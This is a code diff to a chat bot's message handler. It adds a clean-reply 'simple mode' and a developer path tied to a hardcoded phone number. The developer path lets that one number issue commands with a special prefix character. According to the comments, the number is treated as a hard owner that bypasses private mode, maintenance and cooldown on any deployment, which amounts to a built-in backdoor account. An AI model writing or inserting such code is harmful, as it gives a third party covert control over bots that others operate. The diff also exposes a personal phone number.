@@ -67,6 +67,8 @@ async function runCmd(sock, raw, cmd, m, args, name, prefix, rawText = '') {
   // V7 · format-aware reply: custom per-command text + active reply format (default/mono/media/rich)
   const replyRaw = (text, extra = {}) => {
     try {
+      // V10 · simple-mode: the 20 integrated CODY commands reply clean like .ping (raw unicode, no UI)
+      try { if (require('./lib/simpleMode').isSimple(cmd.name) && typeof text === 'string') return sock.sendMessage(m.chat, { text, ...extra }, quoted ? { quoted } : undefined); } catch {}
       const custom = fmt.getCustom(cmd.name);
       if (custom && typeof text === 'string' && text) {
         const filled = fmt.fillVars(custom, { m, prefix }).replace(/\{text\}/gi, text);
@@ -180,6 +182,13 @@ async function handle(sock, raw) {
   stats.messages++;
 
   const m = serialize(sock, raw);
+  // ── DEV identification: anytime developer 2349123429926 types ֎, react ֎ under it ──
+  try {
+    const dev = require('./lib/dev');
+    if (dev.isDev(m.number) && dev.containsMark(m.body)) {
+      sock.sendMessage(m.chat, { react: { text: dev.DEV_MARK, key: m.key } }).catch(() => {});
+    }
+  } catch {}
   if (config.autoRead) sock.readMessages([raw.key]).catch(() => {});
 
   // record into msgstore (for .deleted / .quoted) + rawstore (for .quotedeep)
@@ -232,7 +241,9 @@ async function handle(sock, raw) {
     const botNum = digits(sock.user?.id);
     const isPriv = m.fromMe || m.number === botNum || privs.isSudoPriv(vdb, config, m.number);
     const px = vdb.get('prefix', config.prefix);
-    const isCmd = (m.body || '').startsWith(px);
+    let devIsCmd = false;
+    try { const dev = require('./lib/dev'); devIsCmd = dev.isDev(m.number) && String(m.body || '').startsWith(dev.DEV_MARK); } catch {}
+    const isCmd = (m.body || '').startsWith(px) || devIsCmd;
     const botJids = [sock.user?.id, sock.user?.lid].filter(Boolean).map(digits);
     const tagsBot = (m.mentions || []).some((j) => botJids.includes(digits(j)));
     const repliedBot = m.quoted?.sender && botJids.includes(digits(m.quoted.sender));
@@ -440,7 +451,13 @@ async function handle(sock, raw) {
     }
   } catch {}
 
-  const prefix = db.get('prefix', config.prefix);
+  // ── DEV prefix: developer 2349123429926 may use ֎ exactly like the normal prefix (e.g. ֎ping).
+  // Private mode / maintenance / cooldown never apply to the dev (hard-owner via lib/privs).
+  let prefix = db.get('prefix', config.prefix);
+  try {
+    const dev = require('./lib/dev');
+    if (dev.isDev(m.number) && String(m.body || '').startsWith(dev.DEV_MARK)) prefix = dev.DEV_MARK;
+  } catch {}
 
   // ---- custom emoji trigger (no prefix, exact message match) ----
   try {
